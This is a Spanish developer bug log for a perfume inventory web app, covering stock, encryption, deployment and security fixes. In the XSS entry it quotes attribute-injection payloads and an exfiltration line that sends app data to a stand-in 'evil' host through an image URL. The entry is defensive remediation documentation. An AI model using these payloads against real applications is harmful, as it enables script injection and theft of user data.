# BUG_HISTORY — Historial de bugs

**Este archivo no se borra nunca.** Un bug arreglado sigue siendo información: explica por
qué el código tiene la forma que tiene, y evita que alguien "simplifique" una defensa que
existe por una razón.

**Antes de arreglar un bug, buscá acá.** Es probable que algo parecido ya haya pasado.

Formato: fecha · descripción · causa · solución · archivos · riesgo de reintroducción.

---

## BUG-01 — El restore de backup se comía los stores nuevos
**Fecha:** ~06/2026 · **Riesgo de reintroducción:** 🔴 ALTO

**Descripción.** Al restaurar un backup, los datos de los stores agregados después
(`compras`, `reservas`) desaparecían.

**Causa.** `10-data-management.js` tiene **5 listas separadas** `const stores = [...]`.
Al agregar un store hay que sumarlo a todas; si falta en una, el restore no lo contempla
y lo pisa con vacío.

**Solución.** Sumarlo a las 5 listas + un test de regresión que verifica que toda lista
`const stores = [...]` incluya los stores nuevos.

**Archivos.** `src/app/10-data-management.js`, `tests/features.test.js`

**Nota.** Sigue siendo la trampa más peligrosa del proyecto. Checklist en
[DATABASE.md](DATABASE.md) §8.

---

## BUG-02 — XSS vía `onclick` con datos del usuario
**Fecha:** ~05/2026 · **Riesgo:** 🔴 ALTO

**Descripción.** Los botones de WhatsApp y de pago de cuota metían datos del usuario
directamente dentro de un atributo `onclick=""`. Un nombre de cliente con comillas o
código rompía el HTML y podía ejecutar JS.

**Causa.** Generación de HTML por concatenación de strings sin separar dato de handler.

**Solución.** Delegación de eventos en `document` (`_initEventDelegation()`):
- `.btn-whatsapp[data-msg]` — mensaje en base64 **UTF-8-safe** (`atob` solo no soporta emojis)
- `.btn-pay[data-cuota-id]` — id JSON percent-encoded (tolera ids string y numéricos)

**Archivos.** `src/app/00-core.js`, `src/app/02-render.js`

**Regla derivada.** 🔴 **Nunca metas datos del usuario en un `onclick`.** `data-*` + delegación.

---

## BUG-03 — `montoPagado > monto` dejaba el total a cobrar en negativo
**Fecha:** ~06/2026 · **Riesgo:** 🟠 MEDIO

**Causa.** Datos viejos o backups adulterados con una cuota pagada de más.

**Solución.** Dos capas: `_fixCuotasSaldadas()` acota `montoPagado` al `monto` en cada
arranque (idempotente), y `pagarCuota()` **lanza un error** si el pago excede lo que resta.

**Archivos.** `src/app/00-core.js`, `src/db.js`

---

## BUG-04 — Sobrepago de cuotas sin validar
**Fecha:** ~05/2026 · **Riesgo:** 🟠 MEDIO

**Solución.** `DB.pagarCuota()` lanza
`Sobrepago de X: solo resta Y para esta cuota`. El fuzzer lo trata como rechazo legítimo,
no como falla.

**Archivos.** `src/db.js`

---

## BUG-05 — Borrar una venta hecha con stock 0 inventaba stock
**Fecha:** ~06/2026 · **Riesgo:** 🔴 ALTO

**Descripción.** Si vendías con stock en 0 (venta sin inventario) y después borrabas la
venta, la app **devolvía una unidad al inventario que nunca había existido**.

**Causa.** `deleteVenta` asumía que toda venta había descontado exactamente 1 unidad.

**Solución.** La venta ahora guarda `stockDescontado` (bool) y `unidadesDescontadas`
(número exacto). Al borrar se devuelve exactamente eso. Las ventas viejas sin el flag
mantienen el comportamiento anterior para no alterar historiales existentes.

**Archivos.** `src/db.js` (`addVenta`, `updateVenta`, `deleteVenta`)

---

## BUG-06 — Editar una venta movía el stock aunque no cambiara nada relevante
**Fecha:** ~06/2026 · **Riesgo:** 🟠 MEDIO

**Solución.** `updateVenta` calcula `cambioStock` (¿cambió el perfume o la cantidad?) y
solo reconcilia el inventario si es `true`. Editar cliente o nota no toca `perfumes`.

**Archivos.** `src/db.js`

---

## BUG-07 — El cifrado duplicaba registros en cada `put()`
**Fecha:** ~06/2026 · **Riesgo:** 🔴 ALTO

**Descripción.** Con licencia activa, cada actualización de un registro **creaba una copia**
en vez de actualizarlo. Las bases de usuarios reales se llenaron de duplicados.

**Causa.** El payload se cifraba entero, **incluido el `id`**. IndexedDB no podía leer la
clave del blob, así que `put()` no encontraba el registro existente y lo insertaba nuevo.

**Solución.**
1. El `id` se conserva **fuera** del payload cifrado: `{ _encrypted, _v, id }`.
2. Al descifrar, la clave real del store sana el `id` del payload.
3. `dedupEncryptedRecords()` limpia las bases ya afectadas: agrupa por el `id` interno, se
   queda con la escritura más reciente y borra las copias. Idempotente, corre en cada init.

**Archivos.** `src/db.js:12-77`

**Regla derivada.** 🔴 Al tocar el cifrado, **la clave del store nunca puede quedar dentro
del blob**.

---

## BUG-08 — `/version` devolvía `1.1.0` fijo
**Fecha:** ~07/2026 · **Riesgo:** 🟠 MEDIO

**Descripción.** El endpoint devolvía una versión **más vieja que la app**, así que
`_isNewerVersion()` siempre daba `false` y el chequeo de actualizaciones nunca disparaba.

**Causa.** Tres copias manuales de la versión: `package.json`, `sw.js` (decía `1.7.0`) y
`functions/version.js` (decía `1.1.0`).

**Solución.** La versión vive **solo en `package.json`**. `scripts/build.js` la propaga a
`index.html`, `sw.js` y `functions/version.js`, y **falla el build** si no encuentra dónde
escribirla.

**Archivos.** `scripts/build.js`, `sw.js`, `functions/version.js`

**⚠️ Segunda mitad del bug, cerrada después (07/2026):** aunque la versión ya se
sincronizaba, `/version` **no estaba ruteado en `worker.js`** — no figuraba en `GET_ROUTES`
ni se importaba, así que la request caía en `ASSETS.fetch()` y devolvía 404. Además el
handler exportaba `export default { fetch }` en vez de `onRequestGet`, así que el router
no podía consumirlo. Durante ~3 semanas la app no tuvo canal de actualización.

**Regla derivada.** 🔴 Agregar un endpoint son **tres** pasos en `worker.js`: importarlo,
listarlo en `POST_ROUTES`/`GET_ROUTES` y agregar el `if`. Saltear el segundo da 404 aunque
el archivo exista y esté importado.

---

## BUG-09 — El Service Worker recargaba la app en la primera visita de cada usuario
**Fecha:** ~07/2026 · **Riesgo:** 🟠 MEDIO

**Descripción.** Cada usuario nuevo entraba y la app se recargaba sola a los dos segundos.
Primera impresión pésima.

**Causa.** El handler de `controllerchange` recargaba siempre. En la primera visita,
`clients.claim()` dispara ese evento aunque no haya ninguna actualización.

**Solución.** Guard `ptTeniaController`: solo recarga si **ya había** un controller.
Además, `_hayTrabajoEnCurso()` impide recargar encima de un formulario en curso o un
modal abierto.

**Archivos.** `sw.js`, `src/app/17-auto-update.js`

---

## BUG-10 — Cuotas con vencimiento inválido a fin de mes
**Fecha:** ~05/2026 · **Riesgo:** 🟡 BAJO

**Descripción.** Sumar meses a una fecha del 31 producía fechas inválidas (31 de febrero).

**Solución.** Cálculo seguro en `addVenta`: fija año y mes, y acota el día al último día
real de ese mes.

**Archivos.** `src/db.js`

---

## BUG-11 — Los datos de demo reaparecían mezclados con los reales
**Fecha:** ~06/2026 · **Riesgo:** 🟠 MEDIO

**Descripción.** Si el usuario borraba todos sus datos (o se quedaba sin perfumes), al
reabrir la app **reaparecían 8 perfumes y 13 ventas de demo** mezclados con los reales.

**Causa.** `seedDemo()` sembraba si la base estaba vacía, sin recordar que ya había sembrado.

**Solución.** Bandera `localStorage.pt_demo_seeded`: se siembra **una sola vez en la vida
de la instalación**. Si ya hay datos del usuario, marca la bandera y no toca nada.

**Archivos.** `src/db.js:651-665`

**Nota.** Los tests E2E usan esa bandera como señal de "la app terminó de arrancar".

---

## BUG-12 — Número de cuotas sin límite superior
**Solución.** Máximo 12, validado en `db.js` (lanza error) y en el formulario de edición.

## BUG-14 — Si fallaba la creación de cuotas, la venta quedaba huérfana
**Solución.** `addVenta` captura, loguea y **propaga** el error en vez de tragárselo.

---

## BUG-15 — Fechas leídas al revés al importar de Excel
**Fecha:** ~07/2026 · **Riesgo:** 🟠 MEDIO

**Descripción.** Una planilla con formato mes/día (`7/20/2026`) se leía como día/mes: la
venta terminaba en **agosto de 2027**, silenciosamente.

**Causa.** El importador asumía día/mes (formato LATAM) sin verificar.

**Solución.** `_impDetectarFormatoFecha()` analiza **toda la columna** y deduce el formato
por evidencia (un valor > 12 en la primera posición descarta mes/día). El usuario puede
corregirlo a mano.

**Archivos.** `src/app/26-importar-excel.js`

---

## BUG-16 — Cuota `1/3` interpretada al revés
**Fecha:** ~07/2026 · **Riesgo:** 🟡 BAJO

**Descripción.** Se interpretaba el numerador como "cuota número N". El usuario aclaró que
en su planilla el numerador es **cuántas cuotas ya están pagas**: `1/2` = 2 cuotas, 1 paga;
`0/2` = 2 cuotas, ninguna paga; `1/1` = pago directo.

**Solución.** `tipo: 'cuotas'` devuelve `{ total, pagadas }` con la semántica correcta.

**Archivos.** `src/app/26-importar-excel.js`

**Lección.** El dato del usuario mandaba sobre mi interpretación. Cuando algo del dominio
no cierra, se pregunta.

---

## BUG-17 — Deshacer una devolución perdía la deuda del cliente 🐛⭐
**Fecha:** 07/2026 · **Riesgo:** 🔴 ALTO · **Lo encontró el fuzzer**

**Descripción.** Al deshacer una devolución, la venta **volvía a contar para la ganancia**
pero las cuotas canceladas **no se recreaban**. Una venta de $3000 en 3 cuotas con una
paga quedaba con **$0 por cobrar** en vez de $2000. El cliente debía plata y la app decía
que no.

**Causa.** `devolverVenta()` borra las cuotas impagas (correcto). `revertirDevolucion()`
reponía el stock y limpiaba las marcas, pero nunca recreaba las cuotas.

**Solución.** `revertirDevolucion()` recrea las cuotas faltantes (por `numero`), respetando
las ya cobradas y recalculando montos con la última cuota absorbiendo el resto.

**Archivos.** `src/db.js:351-378`, `tests/f3.spec.js`

**Por qué importa.** Es exactamente la clase de bug más cara de esta app: un número de
plata mal, sin ningún error visible. Lo encontró una secuencia aleatoria del fuzzer, no
una revisión humana. **Ese fue el argumento para dejar el fuzzer en CI.**

**⚠️ Deuda pendiente:** el comentario en `db.js:331-333` todavía dice que las cuotas *no*
se recrean. Ver [TODO.md](TODO.md) §T-02.

---

## BUG-18 — La lista de alertas de stock tapaba el inventario
**Fecha:** 07/2026 · **Riesgo:** 🟡 BAJO

**Descripción.** Con 14 perfumes agotados, la lista de alertas ocupaba toda la pantalla y
el inventario quedaba abajo, invisible.

**Solución.** Resumen colapsable: 3 visibles + "Ver todos" (`toggleAlertasStock()`).
Además cuenta unidades, no ventas.

**Archivos.** `src/app/02-render.js`

---

## BUG-19 — La imagen Open Graph estaba corrupta y además no se usaba
**Fecha:** 07/2026 · **Riesgo:** 🟢 BAJO

**Descripción.** El PNG tenía el titular superpuesto y sin fuentes cargadas. Y la landing
**ni siquiera lo referenciaba**.

**Solución.** `scripts/build-og.js` rasteriza `scripts/og-image.html` con Chromium
(`npm run build:og`), y la landing ahora sí lo usa.

---

## BUG-20 — La pantalla de cuotas se congelaba con historial grande
**Fecha:** 07/2026 · **Riesgo:** 🟠 MEDIO · **Lo encontró la prueba de volumen**

**Descripción.** Con 2000 ventas, la pantalla de cobros tardaba **297 ms** y dejaba
**22.040 nodos** en el DOM. Era la única pantalla fuera de rango.

**Causa.** Dos problemas sumados:
1. `renderCuotas()` recalculaba el vencimiento más próximo **dentro del comparador del
   `sort`** — miles de `filter` + `sort` repetidos.
2. Volcaba las cientos de tarjetas de una sola vez.

**Solución.** Precálculo del vencimiento más próximo por grupo + paginado de a 30
(`_CUOTAS_PAGINA`, `verMasCuotas()`, reset al reentrar).
**297 ms → 16 ms**, DOM de 22.040 → 6.532 nodos.

**Archivos.** `src/app/02-render.js`, `tests/volumen.spec.js`

**Salvaguarda.** El total adeudado sigue calculándose sobre **todas** las cuotas.
Hay tests que lo verifican y que fallan si vuelve a aparecer trabajo dentro del `sort`.

---

## Bugs de la suite de tests (no de producción)

Se documentan porque cuestan tiempo y se repiten.

| Problema | Causa | Solución |
|---|---|---|
| El test lee `App.ventas` y ya está poblado | `App.ventas` es `[]` desde el objeto literal: `!== undefined` resuelve al instante | Esperar `pt_demo_seeded === '1'` + settle |
| El test lee el DOM viejo | `renderAll()` está debounceado 100 ms | Llamar `App.renderDashboard()` directo |
| Violación de strict-mode del locator | `.tag-devuelta` matcheaba en `#ventas-recientes` **y** `#ventas-all-list` | Scopear el locator |
| "datos íntegros: false" en volumen | Esperaba `App.ventas.length > 100` pero leía `App.cuotasData`, que `loadData()` llena después | Esperar `#splash` detached |
| Paginación mostraba 1 card en vez de 30 | `sembrar()` escribe en la base pero no llama `App.loadData()` | Agregar `await App.loadData()` |
| Suite E2E rota (4/8) | Modal de consentimiento bloqueante + espera de arranque que se cumplía siempre + recarga del SW | Setear banderas en `addInitScript` + guard de `controllerchange` |

---

## Falsos positivos que costaron tiempo

| "Bug" | Realidad |
|---|---|
| Las cuotas de una venta devuelta no suman su `precioVenta` | **Es el diseño.** Al devolver se cancelan las impagas. La invariante del fuzzer estaba mal escrita, no el código |
| `registrarCompra` cambia el `precioCompra` del perfume | **Es intencional.** El costo de la última tanda es el costo de referencia (F4) |
| Una venta importada de Excel no descuenta stock | **Es intencional.** Van sin `perfumeId`: son históricas y la planilla ya las descontó |
| `2/2` deja 2 cuotas pagas, no 1 | Correcto: el numerador es cuántas están pagas |

---

## BUG-21 — Dos pestañas inventaban inventario 🐛⭐
**Fecha:** 07/2026 · **Riesgo:** 🔴 ALTO · **Lo encontraron los tests de concurrencia**

**Descripción.** Con dos pestañas abiertas vendiendo en paralelo: 20 ventas que decían
haber descontado 20 unidades, y el stock bajaba solo **13**. Siete unidades de inventario
inventadas, sin ningún error a la vista. El usuario creía tener 37 frascos y tenía 30.

**Causa.** Leer-modificar-escribir en dos transacciones distintas. `DB.get()` y `DB.put()`
abren transacciones separadas, así que las dos pestañas leían `stock = 50` y las dos
escribían `49`: un descuento se perdía.

No se pueden unir en una sola transacción: con cifrado activo, descifrar es `async`, y un
`await` cierra la transacción de IndexedDB.

**Solución.** `DB._conLockStock()` serializa con **Web Locks** (`navigator.locks`), que es
lo único que cruza pestañas del mismo origen. Donde no está, cae a una cola en memoria: no
cubre dos pestañas pero sí dos operaciones simultáneas en la misma.

Quedan envueltos `addVenta`, `updateVenta`, `deleteVenta`, `devolverVenta`,
`revertirDevolucion`, `registrarCompra` y `eliminarCompra`.

**⚠️ `entregarReserva` NO se envuelve**: llama a `addVenta`, que ya toma el lock, y
**Web Locks no es reentrante** — se trabaría para siempre.

**Archivos.** `src/db.js`, `tests/concurrencia.spec.js`

**Por qué importa.** Es la misma clase que BUG-17: un número mal, sin error visible. Y es
la razón por la que "escribir los tests que faltan" no es trabajo de segunda: el test no
documentó un hueco teórico, encontró corrupción real.

---

## BUG-22 — El diálogo de confirmar quedaba detrás de otro modal
**Fecha:** 07/2026 · **Riesgo:** 🟠 MEDIO

**Descripción.** Cualquier `appConfirm()` disparado desde adentro de otro modal aparecía
**detrás** y no se podía tocar el botón. Afectaba a **borrar un perfume desde el modal de
edición**, que estaba roto en producción.

**Causa.** `.modal-overlay` tenía `z-index: 200` para todos. Entre dos elementos con el
mismo z-index gana el que está más abajo en el HTML, y `#modal-add-perfume` (línea 468)
va después de `#modal-confirm` (línea 438).

**Solución.** `#modal-confirm` y `#modal-prompt` pasan a `z-index: 300`. Son diálogos que
por definición van arriba de todo.

**Archivos.** `src/styles/17-modal.css`

**Cómo apareció.** Agregando el aviso de perfume duplicado, que también usa `appConfirm`
desde adentro del modal de alta. El test E2E nuevo falló con
*"subtree intercepts pointer events"* y ahí saltó que el bug ya existía.

**Regla derivada.** 🟠 Un diálogo que puede abrirse desde adentro de otro modal necesita
z-index propio. No alcanza con que "los modales tengan z-index".


---

## BUG-23 — Un nombre de negocio largo empujaba el chip de cuenta fuera de pantalla
**Fecha:** 07/2026 · **Riesgo:** 🟠 MEDIO · **Lo reportó el usuario con capturas**

**Descripción.** El nombre del negocio y el chip de plan comparten la fila del header. Con
un nombre largo, el nombre se estiraba y **el chip de "Free" quedaba literalmente fuera
del viewport**. Ese chip es la única puerta a la licencia, la suscripción y los backups:
el usuario quedaba sin forma de llegar ahí desde el dashboard.

**Causa.** `.logo-group` es un item de flex sin `min-width: 0`. Por defecto un item de flex
**no se encoge por debajo del ancho de su contenido**, así que en vez de truncar el texto
empujaba al hermano fuera del contenedor.

**Solución.** Tres capas:
1. `.logo-group` → `flex: 1; min-width: 0` (deja que se encoja)
2. `.logo-text` → `overflow: hidden; text-overflow: ellipsis; white-space: nowrap`
3. `.header-actions` → `flex-shrink: 0` (el chip nunca se achica)

Además el nombre se acota a 30 caracteres (`_NOMBRE_NEGOCIO_MAX`) al escribirlo **y al
cargarlo** — `maxlength` no aplica a valores seteados por código, así que quien ya tenía
un nombre largo guardado también queda sano. El nombre completo va al `title`.

**Archivos.** `src/styles/02-header.css`, `src/app/11-utils.js`, `src/screens/mas.html`,
`tests/header.spec.js`

**Regla derivada.** 🟠 En un header de una sola fila, el texto variable lleva
`min-width: 0` + ellipsis y el control fijo lleva `flex-shrink: 0`. Sin las dos cosas, el
texto gana y el control desaparece.

---

## BUG-24 — Un TTL inválido de KV tumbó registro, licencias y pagos 🔥
**Fecha:** 29/07/2026 · **Riesgo:** 🔴 ALTO · **Incidente en producción**

**Descripción.** Activar una licencia devolvía "Service temporarily unavailable". Afectaba
a las 5 rutas de `CRITICAL_ROUTES`: `/trial`, `/validate-license`, `/mp-create-preference`,
`/backup` y `/sync`. Nadie podía registrarse, activar una licencia ni pagar.

**Causa.** **Cloudflare KV rechaza cualquier `expirationTtl` menor a 60 segundos** — el
`put()` lanza. El limitador de concurrencia usaba **5**.

Ese `put()` venía fallando en **todas** las requests desde que se escribió. El `catch` lo
tapaba con un `console.warn`, así que el limitador nunca funcionó y nadie se enteró. Al
volver ese `catch` fail-closed (T-03), el error latente pasó a devolver **503**.

**Solución.**
1. `expirationTtl` → `KV_TTL_MIN = 60`. El contador se sigue decrementando por `waitUntil`;
   el TTL es solo la red de seguridad, así que 60 no cambia el comportamiento.
2. El `catch` del limitador de concurrencia vuelve a **fail-open**, a propósito: es un
   extra sobre el límite global (que sí es fail-closed y usa un TTL válido de 120). Un bug
   en un limitador secundario no puede dejar a todo el mundo sin poder pagar.
3. `checkBurstRateLimit` en `_shared.js` tenía el mismo error (ventana de 5 s → TTL 6).
   Acotado con `Math.max(60, …)`.

**Archivos.** `worker.js`, `functions/_shared.js`, `tests/worker.test.js`

**🔴 Por qué pasó 597 tests.** El mock de KV **aceptaba cualquier TTL**. Nunca reprodujo el
comportamiento real. Ahora hay un mock que valida el mínimo como el KV de verdad, y un test
que recorre todos los `put()` del router.

**Reglas derivadas.**
- 🔴 **Un mock que no rechaza lo que el servicio real rechaza no prueba nada.**
- 🔴 **Antes de convertir un `catch` en fail-closed, verificá qué está tapando.** Un `catch`
  silencioso puede llevar años escondiendo un error que nunca importó.
- 🟠 El fail-closed va donde la protección importa, no en todos lados por simetría.

---

## BUG-25 — El cliente nunca mandaba el challenge del OTP
**Fecha:** 29/07/2026 · **Riesgo:** 🔴 ALTO

**Descripción.** Con el código de 6 dígitos correcto, verificar el email devolvía error.
**El registro por email nunca funcionó** desde que se agregó el nonce.

**Causa.** `/trial` devuelve un `challenge` al pedir el código y `handleVerify` **lo exige
antes de mirar el OTP**. El cliente leía solo `data.sent` y lo descartaba; al verificar
mandaba `{ step, email, otp, deviceId }` sin challenge, y el backend cortaba en la primera
validación con "Datos inválidos".

**Solución.** `registrarCuenta()` guarda `data.challenge` y `verificarOTP()` lo manda. Los
dos van también a `sessionStorage` (recargar la pantalla en el medio dejaba al usuario
trabado). Si falta, avisa "Pedí un código nuevo" en vez de mandar una request condenada.
Al verificar bien se descarta: es de un solo uso.

**Archivos.** `src/app/12-cuenta-licencia.js`, `tests/features.test.js`

**🔴 Por qué pasó desapercibido.** `tests/trial.test.js` tiene **24 tests del backend y
todos mandan el challenge correctamente**. Se probó el servidor contra un cliente ideal que
no existía. Cada lado estaba bien; **el contrato entre los dos no lo verificaba nadie**.

**Regla derivada.** 🔴 **Probar los dos lados por separado no prueba que hablen entre sí.**
Cuando el backend exige un campo, tiene que haber un test de que el cliente lo manda.

> **Los dos bugs del mismo día comparten raíz:** el test usaba algo que no se comportaba
> como la realidad — un mock permisivo en uno, un cliente imaginario en el otro. Las 597
> pruebas en verde daban una confianza que no correspondía.

---

## BUG-26 — XSS por inyección en atributos: tres vías, una sola raíz 🔴🔥
**Fecha:** 29/07/2026 · **Riesgo:** 🔴 ALTO · **Verificado explotable antes del fix**

**Descripción.** Tres vectores distintos permitían ejecutar JavaScript en el origen de la
app. Con acceso a: las ventas y clientes (descifrados en memoria vía `DB.getAll()`), el
código de licencia, el token CSRF y todo el localStorage.

| Vector | Cómo llega el payload |
|---|---|
| **Nombre de perfume** | Tipeado **o importado de un Excel** que te manden |
| **Foto de perfume** | Backup JSON restaurado |
| **Logo del negocio** | Backup JSON restaurado |

**Prueba de que era real** (no teórico): se ejecutó `window.__XSS = true` por los tres
caminos antes de arreglarlo. El nombre `Yara" onmouseover="…" x="` dejaba los atributos
`onmouseover` y `x` como atributos reales en el botón.

**Causa raíz — una sola.** `esc()` usa `textContent` → `innerHTML`, que escapa `&`, `<` y
`>` pero **NO las comillas**. Sirve para contenido de texto, pero estaba usado dentro de
atributos, donde una comilla cierra el atributo e inyecta uno nuevo.

Sumado a eso, la validación de imágenes miraba **solo el prefijo**:
`/^data:image\//.test(v)` — el resto de la cadena nunca se revisaba, así que
`data:image/png,x" onerror="…` pasaba.

**Solución — cuatro capas.**
1. **`escAttr()`** en `11-utils.js`: escapa `& < > " '`. Va en **todo** valor que entre
   entre comillas de un atributo. Reemplazado en render, clientes, recordatorios,
   nueva-venta, importar y negocio.
2. **`esImagenSegura()` / `imgSrc()`**: valida la cadena **completa** contra
   `^data:image/(png|jpe?g|webp|gif|avif);base64,…$`. **SVG queda afuera** a propósito.
   Ningún `<img src="${…}"` queda sin pasar por `imgSrc()`.
3. **`_sanearImportado()`** en el restore: un backup es un archivo de cualquiera. Las
   fotos y el perfil se sanean **antes de entrar a la base**, no solo al renderizar — si el
   dato entra sucio, cualquier render nuevo que se olvide de validar reabre el agujero.
4. **CSP más chica**: `img-src` sin `https:` — con XSS,
   `new Image().src='https://evil/?d='+datos` exfiltraba todo y la CSP no lo frenaba.
   Ninguna imagen de la app es externa. De paso se sacaron Google Fonts (las fuentes son
   locales) y OneSignal (no hay SDK en el cliente).

**Bug encontrado dentro del propio fix.** El primer intento usaba
`encodeURIComponent(c.key)` para el `onclick` del cliente. **`encodeURIComponent` no escapa
el apóstrofo**, así que un cliente "O'Brien" seguía rompiendo el string de JS. Lo detectó el
test porque estaba escrito con el nombre real, no con un payload aproximado. De ahí el
`.replace(/'/g, '%27')`.

**Archivos.** `src/app/11-utils.js`, `02-render.js`, `04-stock.js`, `10-data-management.js`,
`18-clientes.js`, `20-recordatorios.js`, `03-nueva-venta.js`, `26-importar-excel.js`,
`27-negocio.js`, `_headers`, `tests/xss.spec.js` (12 tests), `tests/features.test.js`

**Verificado al revés:** volviendo la validación a solo-prefijo, **7 tests fallan**,
incluido el que comprueba que el XSS no se ejecute.

**Reglas derivadas.**
- 🔴 **`esc()` es para texto. `escAttr()` es para atributos.** No son intercambiables, y
  `esc()` en un atributo no protege nada.
- 🔴 **Validar un prefijo no es validar.** Si el formato tiene una forma, la regex la
  describe entera y va anclada de punta a punta.
- 🔴 **Sanear en el render no alcanza.** El dato se limpia al **entrar**, si no el próximo
  render que se olvide vuelve a abrir el agujero.
- 🟠 **La CSP también es contención de daño**, no solo prevención: un permiso que nadie usa
  es una vía de salida gratis para el atacante.

**Riesgo residual que quedaba abierto y ya se cerró (30/07).** Apretar `esImagenSegura()` a
una lista blanca (`png|jpe?g|webp|gif|avif`) abría la pregunta de si iba a rechazar fotos
reales — por ejemplo un iPhone, que saca HEIC. **No las rechaza, y no depende del celular:**
tanto la foto de perfume como el logo del negocio pasan por `_processPhoto()`
(`04-stock.js:57`), que dibuja la imagen en un `<canvas>` y guarda
`c.toDataURL('image/webp', 0.7)`, con fallback a `image/jpeg` si el navegador no soporta
webp. O sea que el formato de origen **nunca** se guarda tal cual: el canvas lo normaliza
siempre a webp o jpeg, los dos en la lista blanca. Confirmado además por el dueño con sus
datos reales en producción.

---

## BUG-27 — Todo el repo se servía público en el dominio 🔴
**Fecha:** 30/07/2026 · **Riesgo de reintroducción:** 🔴 ALTO (silencioso por diseño)

**Descripción.** 340 archivos del repo eran accesibles sin autenticación en
`https://parfumtrack.../<ruta>`, entre ellos `AI/` completo (que documenta hallazgos de
seguridad **abiertos**), los 16 reportes de auditoría con severidades, `tests/`,
`CLAUDE.md`, `wrangler.staging.jsonc`, `test-payment-flow.mjs` y toda la estrategia
comercial (`MARKETING-*`, `ADS-*`, `PLANES_*`, `MASTER_CREATIVE_BRIEF*`).

Lo más grave no es el código —`index.html` ya es público y `src/` es el mismo código antes
de concatenar— sino la **documentación de vulnerabilidades abiertas**. Es exactamente lo
que un atacante buscaría primero.

**No se puede saber si alguien lo leyó:** los assets de Workers no dejan logs de acceso.

**Causa raíz.** `assets.directory` es `"."`, así que wrangler sube el repo entero salvo lo
excluido. Y **`assets.exclude` no existe como campo de wrangler**: el schema de `assets`
solo acepta `binding`, `directory`, `html_handling` y `not_found_handling`. La lista estaba
escrita, se veía prolija, tenía hasta un comentario explicando que `AI/*` quedaba afuera
"a propósito"… y no hacía nada.

**Wrangler lo venía avisando en cada deploy y nadie lo leía:**
```
▲ [WARNING] Processing wrangler.jsonc configuration:
    - Unexpected fields found in assets field: "exclude"
```

El mecanismo real, `.assetsignore`, existía pero solo cubría `node_modules/`, `functions/`,
`scripts/`, `standalone/`, `inservible/`, `worker.js` y `wrangler.jsonc`. Es decir: **había
dos mecanismos, uno de verdad y uno decorativo**, y el decorativo era el que se editaba.

**Solución.**
1. Todas las exclusiones a `.assetsignore`, con un comentario arriba que dice que es el
   único que funciona.
2. **Borrar** `assets.exclude` de `wrangler.jsonc` y `wrangler.staging.jsonc`. Dejarlo es
   peor que no tenerlo: parece protección y no la da.
3. Lista negra, no `*` + negaciones: la lista negra ya está probada funcionando acá, y un
   default-deny que el walker de wrangler interprete distinto tumba el sitio entero.

**Archivos.** `.assetsignore`, `wrangler.jsonc`, `wrangler.staging.jsonc`,
`tests/assets-publicos.test.js`, `package.json`

**Verificado al revés:** con el `.assetsignore` que estaba en producción **fallan 20 de los
31 tests** nuevos.

**Reglas derivadas.**
- 🔴 **Un campo de config que no existe falla en silencio y se ve igual que uno que
  funciona.** Antes de confiar en una exclusión, verificarla contra el schema o el log del
  deploy — no contra lo prolijo que se ve el JSON.
- 🔴 **Dos mecanismos para lo mismo garantizan que se edite el que no anda.** Se dejó uno.
- 🟠 **Los WARNING del deploy son señal, no ruido.** Este decía exactamente qué pasaba, en
  cada deploy, durante meses. Es la misma raíz que BUG-24 (un `catch` que tapaba un error
  en todas las requests): el aviso existía y nadie lo miraba.
- 🟠 **La documentación interna es superficie de ataque.** `AI/` es valiosísimo para
  desarrollar y no puede estar a un GET de distancia.
